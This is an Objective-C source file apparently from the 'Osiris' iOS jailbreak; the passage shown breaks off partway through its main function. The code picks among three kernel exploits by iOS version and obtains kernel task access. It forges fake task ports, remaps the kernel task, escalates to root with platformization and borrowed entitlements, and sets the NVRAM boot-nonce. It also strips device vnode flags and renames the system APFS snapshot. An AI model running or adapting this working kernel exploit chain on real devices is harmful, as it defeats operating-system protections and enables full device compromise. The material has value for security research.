//
//  ViewController.m
//  Osiris
//
//  Created by Pwn20wnd on 10/28/18.
//  Copyright © 2018 Pwn20wnd. All rights reserved.
//

#include <sys/stat.h>
#include <sys/snapshot.h>
#include <sys/attr.h>
#include <sys/mount.h>
#include <sys/utsname.h>
#include <sys/sysctl.h>
#import "ViewController.h"
#include "empty_list_sploit.h"
#include "multi_path_sploit.h"
#include "async_wake.h"
#include "kmem.h"
#include "offsets.h"
#include "QiLin.h"
#include "patchfinder64.h"
#include "kexecute.h"
#include "iokit.h"
#include "kutils.h"
#include "untar.h"
#include "unlocknvram.h"

@interface ViewController ()

@end

@implementation ViewController

const char *empty_list_supported_versions[] = {
    "4397.0.0.2.4~1",
    "4481.0.0.2.1~1",
    "4532.0.0.0.1~30",
    "4556.0.0.2.5~1",
    "4570.1.24.2.3~1",
    "4570.2.3~8",
    "4570.2.5~84",
    "4570.2.5~167",
    "4570.20.55~10",
    "4570.20.62~9",
    "4570.20.62~4",
    "4570.30.79~22",
    "4570.30.85~18",
    "4570.32.1~2",
    "4570.32.1~1",
    "4570.40.6~8",
    "4570.40.9~7",
    "4570.40.9~1",
    "4570.50.243~9",
    "4570.50.257~6",
    "4570.50.279~9",
    "4570.50.294~5",
    "4570.52.2~3",
    "4570.52.2~8",
    "4570.60.10.0.1~16",
    "4570.60.16~9",
    "4570.60.19~25",
    NULL
};

const char *multi_path_supported_versions[] = {
    "4397.0.0.2.4~1",
    "4481.0.0.2.1~1",
    "4532.0.0.0.1~30",
    "4556.0.0.2.5~1",
    "4570.1.24.2.3~1",
    "4570.2.3~8",
    "4570.2.5~84",
    "4570.2.5~167",
    "4570.20.55~10",
    "4570.20.62~9",
    "4570.20.62~4",
    "4570.30.79~22",
    "4570.30.85~18",
    "4570.32.1~2",
    "4570.32.1~1",
    "4570.40.6~8",
    "4570.40.9~7",
    "4570.40.9~1",
    "4570.50.243~9",
    "4570.50.257~6",
    "4570.50.279~9",
    "4570.50.294~5",
    "4570.52.2~3",
    "4570.52.2~8",
    NULL
};

const char *async_wake_supported_versions[] = {
    "4397.0.0.2.4~1",
    "4481.0.0.2.1~1",
    "4532.0.0.0.1~30",
    "4556.0.0.2.5~1",
    "4570.1.24.2.3~1",
    "4570.2.3~8",
    "4570.2.5~84",
    "4570.2.5~167",
    "4570.20.55~10",
    "4570.20.62~9",
    "4570.20.62~4",
    NULL
};

static inline void InitializeKernelExecution(uint64_t add_x0_x0_0x40_ret) { init_kexecute(add_x0_x0_0x40_ret); }
static inline void TerminateKernelExecution(void) { term_kexecute(); }
static inline uint64_t ExecuteInKernel(uint64_t addr, uint64_t Arg0, uint64_t Arg1, uint64_t Arg2, uint64_t Arg3, uint64_t Arg4, uint64_t Arg5, uint64_t Arg6) { return kexecute(addr, Arg0, Arg1, Arg2, Arg3, Arg4, Arg5, Arg6); }
static inline uint32_t ReadAnywhere32(uint64_t KernelAddress) { return rk32(KernelAddress); }
static inline uint64_t ReadAnywhere64(uint64_t KernelAddress) { return rk64(KernelAddress); }
static inline void WriteAnywhere32(uint64_t KernelAddress, uint32_t Value) { wk32(KernelAddress, Value); }
static inline void WriteAnywhere64(uint64_t KernelAddress, uint64_t Value) { wk64(KernelAddress, Value); }
static inline int InitializePatchFinder64(uint64_t KernelBase) { return init_kernel(KernelBase, NULL); }
static inline void TerminatePatchFinder64(void) { term_kernel(); }

// https://github.com/JonathanSeals/kernelversionhacker/blob/3dcbf59f316047a34737f393ff946175164bf03f/kernelversionhacker.c#L92

#define IMAGE_OFFSET 0x2000
#define MACHO_HEADER_MAGIC 0xfeedfacf
#define MAX_KASLR_SLIDE 0x21000000
#define KERNEL_SEARCH_ADDRESS 0xfffffff007004000

#define ptrSize sizeof(uintptr_t)

static vm_address_t get_kernel_base(mach_port_t tfp0) {
    uint64_t addr = 0;
    addr = KERNEL_SEARCH_ADDRESS+MAX_KASLR_SLIDE;
    
    while (1) {
        char *buf;
        mach_msg_type_number_t sz = 0;
        kern_return_t ret = vm_read(tfp0, addr, 0x200, (vm_offset_t*)&buf, &sz);
        
        if (ret) {
            goto next;
        }
        
        if (*((uint32_t *)buf) == MACHO_HEADER_MAGIC) {
            int ret = vm_read(tfp0, addr, 0x1000, (vm_offset_t*)&buf, &sz);
            if (ret != KERN_SUCCESS) {
                printf("Failed vm_read %i\n", ret);
                goto next;
            }
            
            for (uintptr_t i=addr; i < (addr+0x2000); i+=(ptrSize)) {
                mach_msg_type_number_t sz;
                int ret = vm_read(tfp0, i, 0x120, (vm_offset_t*)&buf, &sz);
                
                if (ret != KERN_SUCCESS) {
                    printf("Failed vm_read %i\n", ret);
                    exit(-1);
                }
                if (!strcmp(buf, "__text") && !strcmp(buf+0x10, "__PRELINK_TEXT")) {
                    return addr;
                }
            }
        }
        
    next:
        addr -= 0x200000;
    }
}

size_t
kread(uint64_t where, void *p, size_t size)
{
    int rv;
    size_t offset = 0;
    while (offset < size) {
        mach_vm_size_t sz, chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_read_overwrite(tfp0, where + offset, chunk, (mach_vm_address_t)p + offset, &sz);
        if (rv || sz == 0) {
            fprintf(stderr, "[e] error reading kernel @%p\n", (void *)(offset + where));
            break;
        }
        offset += sz;
    }
    return offset;
}

size_t
kwrite(uint64_t where, const void *p, size_t size)
{
    int rv;
    size_t offset = 0;
    while (offset < size) {
        size_t chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_write(tfp0, where + offset, (mach_vm_offset_t)p + offset, (mach_msg_type_number_t)chunk);
        if (rv) {
            fprintf(stderr, "[e] error writing kernel @%p\n", (void *)(offset + where));
            break;
        }
        offset += chunk;
    }
    return offset;
}

// thx @siguza
typedef struct {
    uint64_t prev;
    uint64_t next;
    uint64_t start;
    uint64_t end;
} kmap_hdr_t;

uint64_t zm_fix_addr(uint64_t addr, uint64_t zone_map_ref) {
    static kmap_hdr_t zm_hdr = {0, 0, 0, 0};
    if (zm_hdr.start == 0) {
        // xxx ReadAnywhere64(0) ?!
        // uint64_t zone_map_ref = find_zone_map_ref();
        fprintf(stderr, "zone_map_ref: %llx \n", zone_map_ref);
        uint64_t zone_map = ReadAnywhere64(zone_map_ref);
        fprintf(stderr, "zone_map: %llx \n", zone_map);
        // hdr is at offset 0x10, mutexes at start
        size_t r = kread(zone_map + 0x10, &zm_hdr, sizeof(zm_hdr));
        fprintf(stderr, "zm_range: 0x%llx - 0x%llx (read 0x%zx, exp 0x%zx)\n", zm_hdr.start, zm_hdr.end, r, sizeof(zm_hdr));
        
        if (r != sizeof(zm_hdr) || zm_hdr.start == 0 || zm_hdr.end == 0) {
            fprintf(stderr, "kread of zone_map failed!\n");
            exit(1);
        }
        
        if (zm_hdr.end - zm_hdr.start > 0x100000000) {
            fprintf(stderr, "zone_map is too big, sorry.\n");
            exit(1);
        }
    }
    
    uint64_t zm_tmp = (zm_hdr.start & 0xffffffff00000000) | ((addr) & 0xffffffff);
    
    return zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp;
}

uint32_t IO_BITS_ACTIVE = 0x80000000;
uint32_t IKOT_TASK = 2;
uint32_t IKOT_NONE = 0;

void convert_port_to_task_port(mach_port_t port, uint64_t space, uint64_t task_kaddr) {
    // now make the changes to the port object to make it a task port:
    uint64_t port_kaddr = getAddressOfPort(getpid(), port);
    
    WriteAnywhere32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_TASK);
    WriteAnywhere32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
    WriteAnywhere32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS), 0xf00d);
    WriteAnywhere64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), space);
    WriteAnywhere64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  task_kaddr);
    
    // swap our receive right for a send right:
    uint64_t task_port_addr = task_self_addr();
    uint64_t task_addr = ReadAnywhere64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint64_t itk_space = ReadAnywhere64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t is_table = ReadAnywhere64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    uint32_t bits = ReadAnywhere32(is_table + (port_index * sizeof_ipc_entry_t) + 8); // 8 = offset of ie_bits in struct ipc_entry
    
#define IE_BITS_SEND (1<<16)
#define IE_BITS_RECEIVE (1<<17)
    
    bits &= (~IE_BITS_RECEIVE);
    bits |= IE_BITS_SEND;
    
    WriteAnywhere32(is_table + (port_index * sizeof_ipc_entry_t) + 8, bits);
}

void make_port_fake_task_port(mach_port_t port, uint64_t task_kaddr) {
    convert_port_to_task_port(port, ipc_space_kernel(), task_kaddr);
}

uint64_t make_fake_task(uint64_t vm_map) {
    uint64_t fake_task_kaddr = kmem_alloc(0x1000);
    
    void* fake_task = malloc(0x1000);
    memset(fake_task, 0, 0x1000);
    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = 0xd00d; // leak references
    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1;
    *(uint64_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;
    *(uint8_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
    kmemcpy(fake_task_kaddr, (uint64_t) fake_task, 0x1000);
    free(fake_task);
    
    return fake_task_kaddr;
}

// @stek29's code.

kern_return_t mach_vm_remap(vm_map_t dst, mach_vm_address_t *dst_addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src, mach_vm_address_t src_addr, boolean_t copy, vm_prot_t *cur_prot, vm_prot_t *max_prot, vm_inherit_t inherit);
int remap_tfp0_set_hsp4(mach_port_t *port, uint64_t zone_map_ref) {
    // huge thanks to @siguza for hsp4 & v0rtex
    // for explainations and being a good rubber duck :p
    
    // see https://github.com/siguza/hsp4 for some background and explaination
    // tl;dr: there's a pointer comparison in convert_port_to_task_with_exec_token
    //   which makes it return TASK_NULL when kernel_task is passed
    //   "simple" vm_remap is enough to overcome this.
    
    // However, vm_remap has weird issues with submaps -- it either doesn't remap
    // or using remapped addresses leads to panics and kittens crying.
    
    // tasks fall into zalloc, so src_map is going to be zone_map
    // zone_map works perfectly fine as out zone -- you can
    // do remap with src/dst being same and get new address
    
    // however, using kernel_map makes more sense
    // we don't want zalloc to mess with our fake task
    // and neither
    
    // proper way to use vm_* APIs from userland is via mach_vm_*
    // but those accept task ports, so we're gonna set up
    // fake task, which has zone_map as its vm_map
    // then we'll build fake task port from that
    // and finally pass that port both as src and dst
    
    // last step -- wire new kernel task -- always a good idea to wire critical
    // kernel structures like tasks (or vtables :P )
    
    // and we can write our port to realhost.special[4]
    
    // we can use mach_host_self() if we're root
    mach_port_t host_priv = fake_host_priv();
    
    int ret;
    uint64_t remapped_task_addr = 0;
    // task is smaller than this but it works so meh
    uint64_t sizeof_task = 0x1000;
    
    uint64_t kernel_task_kaddr;
    
    {
        // find kernel task first
        kernel_task_kaddr = ReadAnywhere64(task_self_addr() + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
        
        while (kernel_task_kaddr != 0) {
            uint64_t bsd_info = ReadAnywhere64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
            
            uint32_t pid = ReadAnywhere32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
            
            if (pid == 0) {
                break;
            }
            
            kernel_task_kaddr = ReadAnywhere64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_PREV));
        }
        
        if (kernel_task_kaddr == 0) {
            printf("[remap_kernel_task] failed to find kernel task\n");
            return 1;
        }
        
        printf("[remap_kernel_task] kernel task at 0x%llx\n", kernel_task_kaddr);
    }
    
    mach_port_t zm_fake_task_port = MACH_PORT_NULL;
    mach_port_t km_fake_task_port = MACH_PORT_NULL;
    ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &zm_fake_task_port);
    ret = ret || mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &km_fake_task_port);
    
    if (ret == KERN_SUCCESS && *port == MACH_PORT_NULL) {
        ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, port);
    }
    
    if (ret != KERN_SUCCESS) {
        printf("[remap_kernel_task] unable to allocate ports: 0x%x (%s)\n", ret, mach_error_string(ret));
        return 1;
    }
    
    // strref \"Nothing being freed to the zone_map. start = end = %p\\n\"
    // or traditional \"zone_init: kmem_suballoc failed\"
    uint64_t zone_map_kptr = zone_map_ref;
    uint64_t zone_map = ReadAnywhere64(zone_map_kptr);
    
    // kernel_task->vm_map == kernel_map
    uint64_t kernel_map = ReadAnywhere64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
    
    uint64_t zm_fake_task_kptr = make_fake_task(zone_map);
    uint64_t km_fake_task_kptr = make_fake_task(kernel_map);
    
    make_port_fake_task_port(zm_fake_task_port, zm_fake_task_kptr);
    make_port_fake_task_port(km_fake_task_port, km_fake_task_kptr);
    
    km_fake_task_port = zm_fake_task_port;
    
    vm_prot_t cur, max;
    ret = mach_vm_remap(km_fake_task_port,
                        &remapped_task_addr,
                        sizeof_task,
                        0,
                        VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR,
                        zm_fake_task_port,
                        kernel_task_kaddr,
                        0,
                        &cur, &max,
                        VM_INHERIT_NONE);
    
    
    if (ret != KERN_SUCCESS) {
        printf("[remap_kernel_task] remap failed: 0x%x (%s)\n", ret, mach_error_string(ret));
        return 1;
    }
    
    if (kernel_task_kaddr == remapped_task_addr) {
        printf("[remap_kernel_task] remap failure: addr is the same after remap\n");
        return 1;
    }
    
    printf("[remap_kernel_task] remapped successfully to 0x%llx\n", remapped_task_addr);
    
    ret = mach_vm_wire(host_priv, km_fake_task_port, remapped_task_addr, sizeof_task, VM_PROT_READ | VM_PROT_WRITE);
    
    if (ret != KERN_SUCCESS) {
        printf("[remap_kernel_task] wire failed: 0x%x (%s)\n", ret, mach_error_string(ret));
        return 1;
    }
    
    uint64_t port_kaddr = getAddressOfPort(getpid(), *port);
    printf("[remap_kernel_task] port kaddr: 0x%llx\n", port_kaddr);
    
    make_port_fake_task_port(*port, remapped_task_addr);
    
    if (ReadAnywhere64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) != remapped_task_addr) {
        printf("[remap_kernel_task] read back tfpzero kobject didnt match!\n");
        return 1;
    }
    
    // lck_mtx -- arm: 8  arm64: 16
    const int offsetof_host_special = 0x10;
    uint64_t host_priv_kaddr = getAddressOfPort(getpid(), mach_host_self());
    uint64_t realhost_kaddr = ReadAnywhere64(host_priv_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    WriteAnywhere64(realhost_kaddr + offsetof_host_special + 4 * sizeof(void*), port_kaddr);
    
    return 0;
}

uint64_t _vfs_context(uint64_t vfs_context_current, uint64_t zone_map_ref) {
    // vfs_context_t vfs_context_current(void)
    uint64_t vfs_context = ExecuteInKernel(vfs_context_current, 1, 0, 0, 0, 0, 0, 0);
    vfs_context = zm_fix_addr(vfs_context, zone_map_ref);
    return vfs_context;
}

int _vnode_lookup(uint64_t vnode_lookup, const char *path, int flags, uint64_t *vpp, uint64_t vfs_context){
    size_t len = strlen(path) + 1;
    uint64_t vnode = kmem_alloc(sizeof(uint64_t));
    uint64_t ks = kmem_alloc(len);
    kwrite(ks, path, len);
    int ret = (int)ExecuteInKernel(vnode_lookup, ks, 0, vnode, vfs_context, 0, 0, 0);
    if (ret != 0) {
        return -1;
    }
    *vpp = ReadAnywhere64(vnode);
    kmem_free(ks, len);
    kmem_free(vnode, sizeof(uint64_t));
    return 0;
}

int _vnode_put(uint64_t vnode_put, uint64_t vnode){
    return (int)ExecuteInKernel(vnode_put, vnode, 0, 0, 0, 0, 0, 0);
}

uint64_t getVnodeAtPath(uint64_t vfs_context, char *path, uint64_t vnode_lookup){
    uint64_t *vpp = (uint64_t *)malloc(sizeof(uint64_t));
    int ret = _vnode_lookup(vnode_lookup, path, O_RDONLY, vpp, vfs_context);
    if (ret != 0){
        printf("unable to get vnode from path for %s\n", path);
        free(vpp);
        return -1;
    }
    uint64_t vnode = *vpp;
    free(vpp);
    return vnode;
}

typedef struct val_attrs {
    uint32_t          length;
    attribute_set_t   returned;
    attrreference_t   name_info;
} val_attrs_t;

int snapshot_list(const char *vol)
{
    struct attrlist attr_list = { 0 };
    int total=0;
    
    attr_list.commonattr = ATTR_BULK_REQUIRED;
    
    char *buf = (char*)calloc(2048, sizeof(char));
    int retcount;
    int fd = open(vol, O_RDONLY, 0);
    while ((retcount = fs_snapshot_list(fd, &attr_list, buf, 2048, 0))>0) {
        total += retcount;
        char *bufref = buf;
        
        for (int i=0; i<retcount; i++) {
            val_attrs_t *entry = (val_attrs_t *)bufref;
            if (entry->returned.commonattr & ATTR_CMN_NAME) {
                printf("%s\n", (char*)(&entry->name_info) + entry->name_info.attr_dataoffset);
            }
            bufref += entry->length;
        }
    }
    free(buf);
    close(fd);
    
    if (retcount < 0) {
        perror("fs_snapshot_list");
        return -1;
    }
    
    return total;
}

int snapshot_check(const char *vol, const char *name)
{
    struct attrlist attr_list = { 0 };
    
    attr_list.commonattr = ATTR_BULK_REQUIRED;
    
    char *buf = (char*)calloc(2048, sizeof(char));
    int retcount;
    int fd = open(vol, O_RDONLY, 0);
    while ((retcount = fs_snapshot_list(fd, &attr_list, buf, 2048, 0))>0) {
        char *bufref = buf;
        
        for (int i=0; i<retcount; i++) {
            val_attrs_t *entry = (val_attrs_t *)bufref;
            if (entry->returned.commonattr & ATTR_CMN_NAME) {
                printf("%s\n", (char*)(&entry->name_info) + entry->name_info.attr_dataoffset);
                if (strstr((char*)(&entry->name_info) + entry->name_info.attr_dataoffset, name))
                    return 1;
            }
            bufref += entry->length;
        }
    }
    free(buf);
    close(fd);
    
    if (retcount < 0) {
        perror("fs_snapshot_list");
        return -1;
    }
    
    return 0;
}

int sha1_to_str(const unsigned char *hash, int hashlen, char *buf, size_t buflen)
{
    if (buflen < (hashlen*2+1)) {
        return -1;
    }
    
    int i;
    for (i=0; i<hashlen; i++) {
        sprintf(buf+i*2, "%02X", hash[i]);
    }
    buf[i*2] = 0;
    return ERR_SUCCESS;
}

char *copyBootHash(void)
{
    io_registry_entry_t chosen = IORegistryEntryFromPath(kIOMasterPortDefault, "IODeviceTree:/chosen");
    
    if (!MACH_PORT_VALID(chosen)) {
        printf("Unable to get IODeviceTree:/chosen port\n");
        return NULL;
    }
    
    CFDataRef hash = (CFDataRef)IORegistryEntryCreateCFProperty(chosen, CFSTR("boot-manifest-hash"), kCFAllocatorDefault, 0);
    
    IOObjectRelease(chosen);
    
    if (hash == nil) {
        fprintf(stderr, "Unable to read boot-manifest-hash\n");
        return NULL;
    }
    
    if (CFGetTypeID(hash) != CFDataGetTypeID()) {
        fprintf(stderr, "Error hash is not data type\n");
        CFRelease(hash);
        return NULL;
    }
    
    // Make a hex string out of the hash
    
    CFIndex length = CFDataGetLength(hash) * 2 + 1;
    char *manifestHash = (char*)calloc(length, sizeof(char));
    
    int ret = sha1_to_str(CFDataGetBytePtr(hash), (int)CFDataGetLength(hash), manifestHash, length);
    
    CFRelease(hash);
    
    if (ret != ERR_SUCCESS) {
        printf("Unable to generate bootHash string\n");
        free(manifestHash);
        return NULL;
    }
    
    return manifestHash;
}

#define APPLESNAP "com.apple.os.update-"

const char *systemSnapshot()
{
    char *BootHash = copyBootHash();
    _assert(BootHash != NULL);
    const char *SystemSnapshot = [[NSString stringWithFormat:@APPLESNAP @"%s", BootHash] UTF8String];
    free(BootHash);
    return SystemSnapshot;
}

int is_symlink(const char *filename) {
    int rv = 0;
    struct stat buf;
    lstat(filename, &buf);
    rv = S_ISLNK(buf.st_mode);
    return rv;
}

int is_directory(const char *filename) {
    int rv = 0;
    struct stat buf;
    lstat(filename, &buf);
    rv = S_ISDIR(buf.st_mode);
    return rv;
}

int snapshot_rename(const char *vol, const char *from, const char *to) {
    int rv = 0;
    int fd = 0;
    fd = open(vol, O_RDONLY, 0);
    rv = fs_snapshot_rename(fd, from, to, 0);
    close(fd);
    return rv;
}

int snapshot_create(const char *vol, const char *name) {
    int rv = 0;
    int fd = 0;
    fd = open(vol, O_RDONLY, 0);
    rv = fs_snapshot_create(fd, name, 0);
    close(fd);
    return rv;
}

int message_size_for_kalloc_size(int kalloc_size) {
    return ((3*kalloc_size)/4) - 0x74;
}

// https://github.com/Matchstic/ReProvision/blob/7b595c699335940f68702bb204c5aa55b8b1896f/Shared/Application%20Database/RPVApplication.m#L102

+ (NSDictionary *)_provisioningProfileAtPath:(NSString *)path {
    NSError *err;
    NSString *stringContent = [NSString stringWithContentsOfFile:path encoding:NSASCIIStringEncoding error:&err];
    stringContent = [stringContent componentsSeparatedByString:@"<plist version=\"1.0\">"][1];
    stringContent = [NSString stringWithFormat:@"%@%@", @"<plist version=\"1.0\">", stringContent];
    stringContent = [stringContent componentsSeparatedByString:@"</plist>"][0];
    stringContent = [NSString stringWithFormat:@"%@%@", stringContent, @"</plist>"];
    
    NSData *stringData = [stringContent dataUsingEncoding:NSASCIIStringEncoding];
    
    NSError *error;
    NSPropertyListFormat format;
    
    id plist = [NSPropertyListSerialization propertyListWithData:stringData options:NSPropertyListImmutable format:&format error:&error];
    
    return plist;
}

int isSupportedByExploit(int exploit) {
    struct utsname u = { 0 };
    const char **versions = NULL;
    switch (exploit) {
        case EMPTY_LIST: {
            versions = empty_list_supported_versions;
            break;
        }
        case MULTI_PATH: {
            versions = multi_path_supported_versions;
            break;
        }
        case ASYNC_WAKE: {
            versions = async_wake_supported_versions;
            break;
        }
        default:
            break;
    }
    if (versions != NULL) {
        uname(&u);
        while (*versions) {
            if (strstr(u.version, *versions) != NULL) {
                return 1;
            }
            versions++;
        }
    }
    return 0;
}

int hasMPTCP() {
    return [[ViewController _provisioningProfileAtPath:[[NSBundle mainBundle] pathForResource:@"embedded" ofType:@"mobileprovision"]][@"Entitlements"][@"com.apple.developer.networking.multipath"] boolValue];
}

int selectExploit() {;
    if (isSupportedByExploit(ASYNC_WAKE) == 1) {
        return ASYNC_WAKE;
    } else if (isSupportedByExploit(MULTI_PATH) == 1 && hasMPTCP() == 1) {
        return MULTI_PATH;
    } else if (isSupportedByExploit(EMPTY_LIST) == 1) {
        return EMPTY_LIST;
    } else {
        return -1;
    }
}

int isSupported() {
    return (!(selectExploit() == -1));
}

int isJailbroken() {
    return (access("/private/var/tmp/slide.txt", F_OK) == 0);
}

// https://github.com/tihmstar/doubleH3lix/blob/4428c660832e98271f5d82f7a9c67e842b814621/doubleH3lix/jailbreak.mm#L57

void suspend_all_threads() {
    thread_act_t other_thread, current_thread;
    unsigned int thread_count;
    thread_act_array_t thread_list;
    
    current_thread = mach_thread_self();
    int result = task_threads(mach_task_self(), &thread_list, &thread_count);
    if (result == -1) {
        exit(1);
    }
    if (!result && thread_count) {
        for (unsigned int i = 0; i < thread_count; ++i) {
            other_thread = thread_list[i];
            if (other_thread != current_thread) {
                int kr = thread_suspend(other_thread);
                if (kr != KERN_SUCCESS) {
                    mach_error("thread_suspend:", kr);
                    exit(1);
                }
            }
        }
    }
}

// https://github.com/tihmstar/doubleH3lix/blob/4428c660832e98271f5d82f7a9c67e842b814621/doubleH3lix/jailbreak.mm#L82

void resume_all_threads() {
    thread_act_t other_thread, current_thread;
    unsigned int thread_count;
    thread_act_array_t thread_list;
    
    current_thread = mach_thread_self();
    int result = task_threads(mach_task_self(), &thread_list, &thread_count);
    if (!result && thread_count) {
        for (unsigned int i = 0; i < thread_count; ++i) {
            other_thread = thread_list[i];
            if (other_thread != current_thread) {
                int kr = thread_resume(other_thread);
                if (kr != KERN_SUCCESS) {
                    mach_error("thread_suspend:", kr);
                }
            }
        }
    }
}

void exploit() {
    if (isJailbroken() == 1) {
        exit(1);
    } else if (!(isSupported() == 1)) {
        exit(1);
    }
    int Exploit = selectExploit();
    switch (Exploit) {
        case 0:
            suspend_all_threads();
            vfs_sploit();
            resume_all_threads();
            break;
        case 1:
            suspend_all_threads();
            mptcp_go();
            resume_all_threads();
            break;
        case 2:
            suspend_all_threads();
            async_wake_go();
            resume_all_threads();
            break;
        default:
            break;
    }
    printf("tfp0: 0x%x\n", tfp0);
    _assert(MACH_PORT_VALID(tfp0));
    uint64_t kernel_base = (uint64_t)get_kernel_base(tfp0);
    printf("kernel_base: 0x%016llx\n", kernel_base);
    uint64_t kernel_slide = kernel_base - KERNEL_SEARCH_ADDRESS;
    printf("kernel_slide: 0x%016llx\n", kernel_slide);
    _assert(InitializePatchFinder64(kernel_base) == 0);
    uint64_t kernproc = find_kernproc();
    printf("kernproc: 0x%016llx\n", kernproc);
    _assert(kernproc);
    uint64_t rootvnode = find_rootvnode();
    printf("rootvnode: 0x%016llx\n", rootvnode);
    _assert(rootvnode);
    uint64_t zone_map_ref = find_zone_map_ref();
    printf("zone_map_ref: 0x%016llx\n", zone_map_ref);
    _assert(zone_map_ref);
    uint64_t vfs_context_current = find_vfs_context_current();
    printf("vfs_context_current: 0x%016llx\n", vfs_context_current);
    _assert(vfs_context_current);
    uint64_t vnode_lookup = find_vnode_lookup();
    printf("vnode_lookup: 0x%016llx\n", vnode_lookup);
    _assert(vnode_lookup);
    uint64_t vnode_put = find_vnode_put();
    printf("vnode_put: 0x%016llx\n", vnode_put);
    _assert(vnode_put);
    uint64_t add_x0_x0_0x40_ret = find_add_x0_x0_0x40_ret();
    printf("add_x0_x0_0x40_ret: 0x%016llx\n", add_x0_x0_0x40_ret);
    _assert(add_x0_x0_0x40_ret);
    uint64_t offsetof_v_mount = 0xd8;
    printf("offsetof_v_mount: 0x%016llx\n", offsetof_v_mount);
    _assert(offsetof_v_mount);
    uint64_t offsetof_mnt_flag = 0x70;
    printf("offsetof_mnt_flag: 0x%016llx\n", offsetof_mnt_flag);
    _assert(offsetof_mnt_flag);
    uint64_t offsetof_v_specinfo = 0x78;
    printf("offsetof_v_specinfo: 0x%016llx\n", offsetof_v_specinfo);
    _assert(offsetof_v_specinfo);
    uint64_t offsetof_si_flags = 0x10;
    printf("offsetof_si_flags: 0x%016llx\n", offsetof_si_flags);
    _assert(offsetof_si_flags);
    TerminatePatchFinder64();
    _assert(initQiLin(tfp0, kernel_base) == 0);
    if (kCFCoreFoundationVersionNumber >= 1452.23) {
        setKernelSymbol("_kernproc", kernproc - kernel_slide);
        setKernelSymbol("_rootvnode", rootvnode - kernel_slide);
    }
    _assert(findKernelSymbol("_kernproc"));
    _assert(findKernelSymbol("_rootvnode"));
    _assert(rootifyMe() == 0);
    _assert(getuid() == 0);
    _assert(platformizeMe() == 0);
    ShaiHuludMe(0);
#define writeTestFile(filename) \
    if (!access(filename, F_OK)) \
        _assert(unlink(filename) == 0); \
    _assert(fclose(fopen(filename, "w")) == 0); \
    _assert(chmod(filename, 0644) == 0); \
    _assert(chown(filename, 0, 0) == 0); \
    _assert(unlink(filename) == 0);
    writeTestFile("/var/mobile/test.txt");
    borrowEntitlementsFromDonor("/usr/bin/sysdiagnose", "--help");
    _assert(unlocknvram() == 0);
    _assert(execCommandAndWait("/usr/sbin/nvram", (char *)[[NSString stringWithFormat:@"com.apple.System.boot-nonce=%@", [[NSUserDefaults standardUserDefaults] objectForKey:@K_BOOT_NONCE]] UTF8String], NULL, NULL, NULL, NULL) == 0);
    _assert(execCommandAndWait("/usr/sbin/nvram", "IONVRAM-FORCESYNCNOW-PROPERTY=com.apple.System.boot-nonce", NULL, NULL, NULL, NULL) == 0);
    _assert(locknvram() == 0);
    InitializeKernelExecution(add_x0_x0_0x40_ret);
    uint64_t vfs_context = _vfs_context(vfs_context_current, zone_map_ref);
    _assert(vfs_context);
    uint64_t devVnode = getVnodeAtPath(vfs_context, "/dev/disk0s1s1", vnode_lookup);
    _assert(devVnode);
    WriteAnywhere32(ReadAnywhere64(devVnode + offsetof_v_specinfo) + offsetof_si_flags, 0);
    _assert(ReadAnywhere64(ReadAnywhere64(devVnode + offsetof_v_specinfo) + offsetof_si_flags) == 0);
    _assert(_vnode_put(vnode_put, devVnode) == 0);
    TerminateKernelExecution();
    int rv = snapshot_list("/");
    switch (rv) {
        case -1: {
            if (!access("/private/var/tmp/rootfsmnt", F_OK))
                _assert(rmdir("/private/var/tmp/rootfsmnt") == 0);
            _assert(mkdir("/private/var/tmp/rootfsmnt", 0755) == 0);
            _assert(spawnAndShaiHulud("/sbin/mount_apfs", "/dev/disk0s1s1", "/private/var/tmp/rootfsmnt", NULL, NULL, NULL) == 0);
            borrowEntitlementsFromDonor("/sbin/fsck_apfs", NULL);
            rv = snapshot_list("/private/var/tmp/rootfsmnt");
            _assert(!(rv == -1));
            _assert(snapshot_rename("/private/var/tmp/rootfsmnt", systemSnapshot(), "orig-fs") == 0);
            _assert(reboot(0x400) == 0);
            break;
        }
        case 0: {
            borrowEntitlementsFromDonor("/sbin/fsck_apfs", NULL);
            _assert(snapshot_create("/", "orig-fs") == 0);
            borrowEntitlementsFromDonor("/usr/bin/sysdiagnose", "--help");
        }
        default:
            break;
    }
    uint64_t rootfs_vnode = ReadAnywhere64(rootvnode);
